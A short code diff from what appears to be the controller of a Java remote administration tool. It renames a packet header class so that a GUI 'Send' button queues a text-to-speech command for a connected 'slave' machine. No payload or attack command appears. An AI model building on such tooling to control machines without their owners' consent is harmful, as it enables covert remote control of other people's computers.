@@ -21,8 +21,8 @@ import com.redpois0n.ErrorDialog;
 import com.redpois0n.Main;
 import com.redpois0n.Slave;
 import com.redpois0n.common.OperatingSystem;
+import com.redpois0n.packets.OutgoingHeader;
 import com.redpois0n.packets.incoming.PacketBuilder;
-import com.redpois0n.packets.outgoing.Header;
 import com.redpois0n.utils.IOUtils;
 
 
@@ -72,7 +72,7 @@ public class PanelControlSpeech extends PanelControlParent {
 		JButton btnSend = new JButton("Send");
 		btnSend.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent e) {
-				slave.addToSendQueue(new PacketBuilder(Header.SPEECH, txt.getText().trim()));
+				slave.addToSendQueue(new PacketBuilder(OutgoingHeader.SPEECH, txt.getText().trim()));
 			}
 		});
 		btnSend.setIcon(new ImageIcon(PanelControlSpeech.class.getResource("/icons/right.png")));
